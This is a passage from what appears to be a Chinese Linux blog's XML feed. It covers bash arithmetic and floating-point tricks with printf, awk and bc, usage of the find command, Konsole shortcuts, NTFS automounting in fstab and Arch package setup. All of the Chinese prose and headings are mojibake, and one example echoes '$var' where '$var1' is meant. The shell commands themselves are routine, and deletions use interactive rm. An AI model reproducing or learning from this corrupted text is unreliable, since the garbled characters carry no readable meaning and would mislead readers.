<code>$(())</code>ã€‚æ³¨æ„ï¼Œä¸éœ€è¦å°†åŒæ‹¬å·ä¸­è¡¨è¾¾å¼é‡Œçš„å¤§äºå·è½¬ä¹‰ã€‚è¿™æ˜¯åŒæ‹¬å·å‘½ä»¤æä¾›çš„å¦ä¸€ä¸ªé«˜çº§ç‰¹æ€§ã€‚</p></blockquote><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">var1=3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$var1</span></span></span><br><span class="line">3</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">((var1 += <span class="number">3</span>)) &amp;&amp; <span class="built_in">echo</span> <span class="variable">$var</span></span></span><br><span class="line">6</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">var1=$((var1 + <span class="number">4</span>)) &amp;&amp; <span class="built_in">echo</span> <span class="variable">$var1</span></span></span><br><span class="line">10</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $((var1++))</span></span><br><span class="line">10</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="variable">$var1</span> &amp;&amp; <span class="built_in">echo</span> $((++var1))</span></span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="è¿›åˆ¶è¿ç®—">è¿›åˆ¶è¿ç®—</h3><p>æ ¼å¼ï¼š<code>base#number</code></p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $(( <span class="number">16</span>#A+<span class="number">2</span> ))</span></span><br><span class="line">12</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $(( <span class="number">8#10</span> + <span class="number">2</span>))</span></span><br><span class="line">10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> $(( <span class="number">8#10</span> + <span class="number">10#2</span>))</span></span><br><span class="line">10</span><br></pre></td></tr></table></figure><h3 id="æµ®ç‚¹æ•°è¿ç®—">æµ®ç‚¹æ•°è¿ç®—</h3><p>å¯ä»¥å‘ç°ä¾‹å¦‚<code>$(( 3/2 ))</code>çš„ç®—æ•°æ‰©å±•çš„è¿”å›å€¼éƒ½æ˜¯æ•´æ•°ï¼Œè€Œä¸æ˜¯æµ®ç‚¹æ•°ï¼Œå› æ­¤ï¼Œå½“éœ€è¦å¾—åˆ°æµ®ç‚¹æ•°æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥å¤„ç†ã€‚</p><h4 id="ä½¿ç”¨-printf-å†…ç½®å‘½ä»¤">ä½¿ç”¨ printf å†…ç½®å‘½ä»¤</h4><p>å…¬å¼ï¼š</p><p><code>printf %.&lt;precision&gt;f "$((10**&lt;multiplier&gt; * 2/3))e-&lt;multiplier&gt;</code></p><p>æ³¨æ„ï¼š<code>%.&lt;precision&gt;f</code>é‡Œé¢çš„ç²¾åº¦ä¸è¦æ¯” multiplierè‡ªèº«å¤§ï¼Œå¦åˆ™ä¼šå¡«å……æ•°å­—é›¶ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">printf</span> <span class="string">&quot;ç»“æœä¸º: %.3f\n&quot;</span> <span class="string">&quot;<span class="subst">$(( 10**3 * 2/3)</span>)e-3&quot;</span></span></span><br><span class="line">ç»“æœä¸º: 0.666</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">printf</span> <span class="string">&quot;ç»“æœä¸º: %.1f\n&quot;</span> <span class="string">&quot;<span class="subst">$(( 10**3 * 2/3)</span>)e-3&quot;</span></span></span><br><span class="line">ç»“æœä¸º: 0.7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">printf</span> <span class="string">&quot;ç»“æœä¸º: %.5f\n&quot;</span> <span class="string">&quot;<span class="subst">$(( 10**3 * 2/3)</span>)e-3&quot;</span></span></span><br><span class="line">ç»“æœä¸º: 0.66600</span><br></pre></td></tr></table></figure><h4 id="awk-å‘½ä»¤">awk å‘½ä»¤</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&quot;BEGIN &#123;print 100/3&#125;&quot;</span></span></span><br><span class="line">33.3333</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&quot;BEGIN &#123;x=100/3; y=6; z=x*y; print z&#125;&quot;</span></span></span><br><span class="line">200</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&quot;BEGIN &#123;printf \&quot;%.2f\n\&quot;, 100/3&#125;&quot;</span></span></span><br><span class="line">33.33</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è´Ÿæ•°æ—¶ï¼Œæ³¨æ„è´Ÿå·å‰é¢è¦æœ‰ç©ºæ ¼ï¼š<code>awk "BEGIN &#123;print -8.4 - -8&#125;"</code></p><h4 id="bc-å‘½ä»¤">bc å‘½ä»¤</h4><p>bc - An arbitrary precision calculator language</p><ul><li><p>æµ®ç‚¹è¿ç®—æ˜¯ç”±å†…å»ºå˜é‡ <code>scale</code>æ§åˆ¶çš„ã€‚å¿…é¡»å°†è¿™ä¸ªå€¼è®¾ç½®ä¸ºä½ å¸Œæœ›åœ¨è®¡ç®—ç»“æœä¸­ä¿ç•™çš„å°æ•°ä½æ•°ï¼Œå¦åˆ™æ— æ³•å¾—åˆ°æœŸæœ›çš„ç»“æœã€‚</p></li><li><p>scale å˜é‡çš„é»˜è®¤å€¼æ˜¯ 0ã€‚åœ¨ scale å€¼è¢«è®¾ç½®å‰ï¼Œbashè®¡ç®—å™¨çš„è®¡ç®—ç»“æœä¸åŒ…å«å°æ•°ä½ã€‚åœ¨å°†å…¶å€¼è®¾ç½®æˆ 4 åï¼Œbashè®¡ç®—å™¨æ˜¾ç¤ºçš„ç»“æœåŒ…å«å››ä½å°æ•°</p></li><li><p><code>-l</code> é»˜è®¤ä¿ç•™ 20 ä½å°æ•°</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;1.6+3/2&quot;</span>|bc</span></span><br><span class="line">2.6</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;15.6+299.33*2.3/7.4&quot;</span> | bc</span></span><br><span class="line">108.63500000000000000000</span><br></pre></td></tr></table></figure><p>ä¿ç•™æŒ‡å®šå°æ•°ä½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;scale=2; 2/3&quot;</span> | bc</span></span><br><span class="line">.66</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> å’Œ bc</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;scale=3;3/2&quot;</span> | bc</span></span><br><span class="line">1.500</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">awk å’Œ <span class="built_in">printf</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">awk <span class="string">&#x27;BEGIN&#123;printf &quot;%.3f\n&quot;, 3/2&#125;&#x27;</span></span></span><br><span class="line">1.500</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š echo å’Œ bc ä¿ç•™æŒ‡å®šå°æ•°çš„æ–¹æ³•æœ‰äº›ä¸ç²¾ç¡®ï¼Œ <strong>echoæœ‰æ—¶ç›´æ¥æˆªæ–­ï¼Œè€Œä¸å®æ–½å››èˆäº”å…¥</strong>ï¼Œå› æ­¤ï¼Œå»ºè®®ä½¿ç”¨çš„ printf æˆ–è€…æ˜¯awk. æ¡ˆä¾‹ï¼š</p><p><ahref="https://www.hackerrank.com/challenges/bash-tutorials---compute-the-average/forum">Computethe Average</a></p><p>å½“ä½ éœ€è¦è¿›è¡Œå¤§é‡è¿ç®—ï¼Œåœ¨ä¸€ä¸ªå‘½ä»¤è¡Œä¸­åˆ—å‡ºå¤šä¸ªè¡¨è¾¾å¼å°±ä¼šæœ‰ç‚¹éº»çƒ¦ï¼Œå¯ä»¥ä½¿ç”¨here documentï¼ˆå†…è”é‡å®šå‘ï¼‰ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">variable=$(bc &lt;&lt; EOF</span><br><span class="line">options</span><br><span class="line">statements</span><br><span class="line">expressions</span><br><span class="line">EOF</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šå°†é€‰é¡¹å’Œè¡¨è¾¾å¼æ”¾åœ¨è„šæœ¬çš„ä¸åŒè¡Œä¸­å¯ä»¥è®©å¤„ç†è¿‡ç¨‹å˜å¾—æ›´æ¸…æ™°ï¼Œæé«˜æ˜“è¯»æ€§</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://www.shell-tips.com/bash/math-arithmetic-calculation/#introduction-to-integer-and-floating-points">MathArithmetic: How To Do Calculation in Bash?</a></li><li>Linux å‘½ä»¤è¡Œä¸ Shell è„šæœ¬ç¼–ç¨‹å¤§å…¨</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>find å‘½ä»¤</title>
      <link href="/blog/2020/08/10/linux/tools/find/"/>
      <url>/blog/2020/08/10/linux/tools/find/</url>
      
        <content type="html"><![CDATA[<h2 id="å‘½ä»¤æ ¼å¼">å‘½ä»¤æ ¼å¼</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find [where to start searching from] [expression determines what to find] [-options] [what to find]</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3><p>find å‘½ä»¤: <code>find . -name "?fs*"</code></p><p>è§£é‡Š:</p><ol type="1"><li><code>.</code>ï¼Œè¡¨ç¤ºæœç´¢ä½ç½®ä»å½“å‰ç›®å½•æœç´¢ï¼Œ<strong>å¦‚æœä½ ä¸æŒ‡å®šæœç´¢çš„ä½ç½®ï¼Œé‚£ä¹ˆé»˜è®¤ä»å½“å‰ç›®å½•æœç´¢ã€‚</strong></li><li><code>-name</code>ï¼Œ é€‰é¡¹æŒ‡å®šæœç´¢ä»€ä¹ˆæ ·æ–‡ä»¶åï¼Œåé¢è·Ÿexpression,å¯ä»¥ä½¿ç”¨å…ƒå­—ç¬¦ã€‚</li><li><code>"?fs*"</code>ï¼Œ è¡¨ç¤ºæœç´¢ç¬¬ä¸€ä¸ªå­—æ¯ä»»æ„ï¼Œç¬¬äºŒä¸‰ä¸ªå­—æ¯ä¸º<code>fs</code>ï¼Œåé¢å­—æ¯ä»»æ„çš„æ–‡ä»¶åã€‚</li></ol><h2 id="options">Options</h2><p>å­¦ä¹ ä¸€ä¸‹å¸¸ç”¨çš„é€‰é¡¹ã€‚</p><ul><li><code>-exec CMD</code>: The file being searched which meets theabove criteria and returns 0 for as its exit status for successfulcommand execution.</li><li><code>-ok CMD</code> : It works same as -exec except the user isprompted first.</li><li><code>-size +N/-N[cwbkMG]</code> : Search for files of â€˜Nâ€™blocks;</li><li>timestampï¼š search for file of specific timestamp<code>-atime</code>ã€<code>-modify</code>ã€<code>change</code></li><li><code>-type TYPE</code>ï¼šThe directory TYPE is <code>d</code>ï¼ŒThefile TYPE is <code>f</code></li><li><code>-empty</code> : Search for empty files and directories.</li><li><code>-newer file</code> : Search for files that weremodified/created after â€˜fileâ€™.</li></ul><h2 id="emptynewer">emptyï¼Œnewer</h2><p><code>-empty</code> æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ find -empty</span><br><span class="line">./hello</span><br><span class="line"></span><br><span class="line"># violetv at manjaro in ~/test [10:40:33]</span><br><span class="line">$ find ./ -empty</span><br><span class="line">./hello</span><br></pre></td></tr></table></figure><p><code>-newer file</code> æµ‹è¯•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find -newer test2.py</span></span><br><span class="line">.</span><br><span class="line">./full</span><br><span class="line">./hello</span><br><span class="line">./world</span><br><span class="line">./world/test</span><br><span class="line">./world/test/test.txt</span><br></pre></td></tr></table></figure><h2 id="size"><code>-size</code></h2><p><code>-size +N/-N[cwbkMG]</code> : Search for files of â€˜Nâ€™blocks;</p><p><strong>Bear in mind that the size is rounded up to the nextunit</strong>. Therefore -size -1M is not equivalent to -size-1048576c.</p><p><code>+N</code> means size &gt; â€˜Nâ€™ blocks and <code>-N</code> meanssize &lt; 'N' blocks. No <code>+</code> or <code>-</code> meansequal.</p><p>Unit:</p><ul><li><code>b</code>ï¼š for 512-byte blocks (this is the default if nosuffix is used)</li><li><code>c</code>ï¼š for bytes</li><li><code>k</code>ï¼š for kibibytes (KiB, units of 1024 bytes)</li><li><code>M</code>ï¼š for mebibytes (MiB, unitsof<code>1024 \* 1024 = 1048576 bytes</code>)</li><li><code>G</code>ï¼š for gibibytes (GiB, units of<code>1024 * 1024 * 1024 = 1073741824 bytes</code>)</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -size +2G</span></span><br><span class="line">-rw-r--r-- 1 violetv violetv 2897272832 Aug  1 10:35 ./full</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -<span class="built_in">type</span> f  -size +1k -<span class="built_in">exec</span> <span class="built_in">ls</span> -hl &#123;&#125; \;</span></span><br><span class="line">-rw-r--r-- 1 violetv violetv 1.8G Aug  1 11:14 ./full</span><br></pre></td></tr></table></figure><h2 id="timestamp">timestamp</h2><p>Linux has 3 time stamps associated to a file:</p><ol type="1"><li>Access - the last time the file was read</li><li>Modify - the last time the file was modified (content has beenmodified)</li><li>Change - the last time meta data of the file was changed</li></ol><p>é€‰é¡¹ï¼š <code>-amin, -atime, -cmin, -ctime, -mmin,-mtime</code></p><p>é€‰é¡¹å¼€å¤´ä¸º 3 ç§æ—¶é—´æˆ³çš„é¦–å­—æ¯ã€‚ <code>-mtime n</code>ï¼šæŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€è¿‘<code>n*24</code> è¢«ä¿®æ”¹çš„æ–‡ä»¶ <code>-amin n</code>ï¼š æŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€è¿‘ nåˆ†é’Ÿè®¿é—®çš„æ–‡ä»¶ <code>+</code> å’Œ <code>-</code> è¡¨ç¤ºå¤§äºå°äº</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find -atime +1</span></span><br><span class="line">.</span><br><span class="line">./dfs.py</span><br><span class="line">./tempCodeRunnerFile.py</span><br><span class="line">./test2.py</span><br><span class="line">./self_print.py</span><br><span class="line">./some.txt</span><br><span class="line">./reversed_cls.py</span><br><span class="line">./str_repr.py</span><br><span class="line">./spoofing.py</span><br><span class="line">./hashable.py</span><br></pre></td></tr></table></figure><h2 id="exec-å’Œ--ok"><code>-exec</code> å’Œ <code>-ok</code></h2><p><code>-exec</code> åé¢çš„æ ¼å¼æ˜¯ï¼š<code>å‘½ä»¤+ç©ºæ ¼+&#123;&#125;+ç©ºæ ¼+\;</code></p><ul><li>èŠ±æ‹¬å· <code>&#123;&#125;</code>ï¼Œä»£è¡¨å‰é¢ find å‘½ä»¤æŸ¥æ‰¾å‡ºæ¥çš„æ–‡ä»¶åã€‚</li><li>ä»¥åˆ†å· ";"ä½œä¸ºç»“æŸæ ‡è¯†ç¬¦çš„ï¼Œè€ƒè™‘åˆ°å„ä¸ªç³»ç»Ÿå¹³å°å¯¹åˆ†å·çš„ä¸åŒè§£é‡Šï¼Œæˆ‘ä»¬åœ¨åˆ†å·å‰å†åŠ ä¸ªåæ–œæ ï¼Œä¾¿äºç§»æ¤ã€‚</li></ul><ol type="1"><li><p>ä½¿ç”¨ find å‘½ä»¤æŸ¥æ‰¾ç›¸å…³æ–‡ä»¶åï¼Œå†ä½¿ç”¨ rm å‘½ä»¤å°†å®ƒä»¬åˆ é™¤</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -size +1G -<span class="built_in">exec</span> <span class="built_in">rm</span> -i &#123;&#125; \;</span></span><br><span class="line">rm: remove regular file &#x27;./full&#x27;? ^C</span><br></pre></td></tr></table></figure></p></li><li><p>æœç´¢åŒ¹é…åˆ°çš„æ–‡ä»¶ä¸­çš„å…³é”®å†…å®¹</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*.py&quot;</span> -<span class="built_in">exec</span> grep <span class="string">&quot;lambda&quot;</span> &#123;&#125; \;</span></span><br><span class="line">pkt = sniff(filter=&#x27;tcp&#x27;, prn=lambda pkt:pkt.show())</span><br></pre></td></tr></table></figure></p></li><li><p>æŸ¥æ‰¾æ–‡ä»¶å¹¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [11:28:55]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*.py&quot;</span> -<span class="built_in">exec</span>  <span class="built_in">mv</span> &#123;&#125; ../test_tmp \;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/test [11:29:13]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll ../test_tmp</span></span><br><span class="line">total 32K</span><br><span class="line">-rwxrwxrwx 1 violetv violetv 772 Jul 22 15:07 dfs.py</span><br><span class="line">-rwxrwxrwx 1 violetv violetv 728 Jul 20 21:20 hashable.py</span><br><span class="line">-rwxrwxrwx 1 violetv violetv 520 Jul 22 16:23 reversed_cls.py</span><br></pre></td></tr></table></figure></p></li><li><p>åˆ é™¤ n å¤©å‰çš„æ–‡ä»¶</p><p><code>find path -type f -mtime +n -exec rm -fi &#123;&#125; \ï¼›</code></p></li><li><p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ä¸ªæ•°:</p><p><code>find ./ | wc -l</code></p></li><li><p>find ä¸ xargs é…åˆ ç±»ä¼¼äºä½¿ç”¨ <code>-exec</code>ï¼Œä½†æ˜¯ xargsé€Ÿåº¦æ›´å¿«ã€‚</p><ul class="task-list"><li><label><input type="checkbox" />å…³äº xargså¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšæ–‡ï¼šxargs å‘½ä»¤</label></li></ul></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li>manual of find: <code>man find</code></li><li><ahref="https://mp.weixin.qq.com/s?__biz=MzU3NTgyODQ1Nw==&amp;mid=2247485216&amp;idx=1&amp;sn=c6d972e5a09d1d60433d733c3b3e0365&amp;=41#wechat_redirect">Linuxä¸‹ find ä¸ exec çš„è”æ‰‹å¹²å¤§äº‹</a></li><li><ahref="https://stackoverflow.com/questions/40630695/linux-modify-file-modify-access-change-time">Linux- modify file modify/access/change time</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> find </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro KDE ä½¿ç”¨</title>
      <link href="/blog/2020/08/07/linux/manjaro/manjaro_usage/"/>
      <url>/blog/2020/08/07/linux/manjaro/manjaro_usage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é‡åˆ°ä»€ä¹ˆï¼Œéšæ—¶æ›´æ–°</p></blockquote><h2 id="konsole">Konsole</h2><p>Konsole å¿«æ·é”®ï¼š</p><p><code>Ctrl+Alt+t</code>: æ‰“å¼€ Konsole</p><p><code>Ctrl+ (</code>: å·¦/å³åˆ†å‰²è§†å›¾</p><p><code>Ctrl+ )</code>: æ‹†åˆ†è§†å›¾é¡¶éƒ¨/åº•éƒ¨</p><p><code>Shift+ Tab</code>: åœ¨æ‹†åˆ†è§†å›¾ä¹‹é—´å¾ªç¯</p><p><code>Ctrl + Shift+ Left Arrow/ Right Arrow</code>:åœ¨æ‹†åˆ†è§†å›¾çª—æ ¼ä¹‹é—´åˆ‡æ¢</p><p><code>Shift+ Left Arrow/ Right Arrow</code>:åœ¨é€‰é¡¹å¡/è§†å›¾ä¹‹é—´å¾ªç¯æ˜¾ç¤ºå½“å‰è§†å›¾</p><p><code>Ctrl + shift+w</code>: å…³é—­å½“å‰è§†å›¾</p><p><code>Ctrl + shift +Tab</code> æˆ–è€… <code>Ctrl + w</code>:åˆ›å»ºæ–°æ ‡ç­¾é¡µ</p><p><code>Ctrl +shift+c</code>ï¼š Copy</p><p><code>Ctrl +shift+v</code>ï¼š Paste ï¼ˆFile pathï¼‰</p><p><code>Shift+Ctrl+F</code> æ‰“å¼€ Findçª—å£ï¼Œæä¾›å¾…æœç´¢æ–‡æœ¬çš„æœç´¢é€‰é¡¹</p><p><code>reset</code> å‘½ä»¤ï¼šåˆå§‹åŒ–ï¼ˆé‡ç½®ï¼‰ç»ˆç«¯</p><p><code>Ctrl+Shift+q</code> é€€å‡º Konsole Terminal ä»¿çœŸåº”ç”¨</p><h2 id="å¼€æœºè‡ªåŠ¨æŒ‚è½½-ntfs-æ ¼å¼åˆ†åŒº">å¼€æœºè‡ªåŠ¨æŒ‚è½½ NTFS æ ¼å¼åˆ†åŒº</h2><ol type="1"><li><p>å®‰è£… ntfs-3g</p><p><code>sudo pacman -S ntfs-3g</code></p></li><li><p>ä¿®æ”¹<code>fstab</code></p><p>sudo vim /etc/fstab</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># /etc/fstab: static file system information</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span></span></span><br><span class="line"></span><br><span class="line">/dev/sdb1 /run/media/realyee/notes ntfs-3g defaults 0 0</span><br><span class="line">/dev/sdb2 /run/media/realyee/software ntfs-3g defaults 0 0</span><br></pre></td></tr></table></figure></p><p>è¯´æ˜ï¼ŒæŠŠ/dev/sdb1 æŒ‚åœ¨åˆ° <code>/run/media/realyee/notes</code>ç›®å½•ä¸‹ï¼Œtype ä¸º <code>ntfs-3g</code> ä»¥åæ¯æ¬¡å¼€æœºï¼ŒManjaroéƒ½ä¼šè‡ªåŠ¨æŒ‚è½½åˆ†åŒºã€‚</p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://wiki.archlinux.org/index.php/Fstab">fstab</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arch å‘è¡Œç‰ˆé…ç½®</title>
      <link href="/blog/2020/08/07/linux/manjaro/arch_config/"/>
      <url>/blog/2020/08/07/linux/manjaro/arch_config/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰ªåˆ‡æ¿">å‰ªåˆ‡æ¿</h2><p><code>yay -S xclip</code></p><h2 id="è§£å‹è½¯ä»¶">è§£å‹è½¯ä»¶</h2><p>æ·»åŠ å¯¹ 7zipï¼Œrarï¼Œ zip çš„æ”¯æŒ</p><p><code>yay -S unarchiver p7zip rar unzip</code></p><h2 id="è“ç‰™">è“ç‰™</h2><ol type="1"><li><code>sudo pacman -S bluez bluez-utils bluedevil</code></li><li>Start/enable bluetooth.service.</li></ol><ul><li>bluez: æä¾›è“ç‰™åè®®æ ˆ</li><li>bluez-utils: æä¾› bluetoothctl å·¥å…·</li><li>bluedevil: KDE's blutooth tool</li></ul><h2 id="è“ç‰™è€³æœº">è“ç‰™è€³æœº</h2><p><code>sudo pacman -S pulseaudio-alsa, pulseaudio-bluetooth pavucontrol pulseaudio-alsa</code></p><ul><li>pulseaudio-bluetooth åˆ™ä¸º bluez æä¾›äº† PulseAudioéŸ³é¢‘æœåŠ¡,è‹¥æ²¡æœ‰å®‰è£…åˆ™è“ç‰™è®¾å¤‡åœ¨é…å¯¹å®Œæˆå,è¿æ¥ä¼šå¤±è´¥,æç¤º</li><li>pavucontrol åˆ™æä¾›äº† pulseaudio çš„å›¾å½¢åŒ–æ§åˆ¶ç•Œé¢</li><li>pulseaudio-alsa(å¯é€‰)åˆ™ä½¿ pulseaudio å’Œ alsa ååŒä½¿ç”¨ï¼Œä¹‹åå°±å¯ä»¥ç”¨alsamixer æ¥ç®¡ç†è“ç‰™éŸ³é¢‘äº†</li></ul><h2 id="è‡ªåŠ¨æŒ‚è½½">è‡ªåŠ¨æŒ‚è½½</h2><ol type="1"><li><p>å®‰è£… ntfs-3g <code>sudo pacman -S ntfs-3g</code></p></li><li><p>ç¡®å®šè¦æŒ‚è½½çš„åˆ†åŒº <code>fdisk -l</code></p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Device          Start        End   Sectors   Size Type</span><br><span class="line">/dev/sdb1        2048  652224504 652222457   311G Microsoft basic data</span><br><span class="line">/dev/sdb2   652224512 1302949805 650725294 310.3G Microsoft basic data</span><br><span class="line">/dev/sdb3  1302949808 1953525134 650575327 310.2G Microsoft basic 